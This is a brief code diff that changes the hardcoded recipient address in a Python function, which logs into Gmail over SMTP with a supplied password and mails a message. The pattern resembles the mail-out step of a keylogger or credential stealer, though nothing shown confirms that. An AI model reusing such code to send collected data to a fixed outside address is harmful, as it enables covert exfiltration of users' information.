@@ -9,7 +9,7 @@ def mail(email, pssd, mssg):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, pssd)
-    server.sendmail(email, 'cybercreed010@gmail.com', mssg)
+    server.sendmail(email, 'kjindal0@gmail.com', mssg)
 
     server.quit()
 
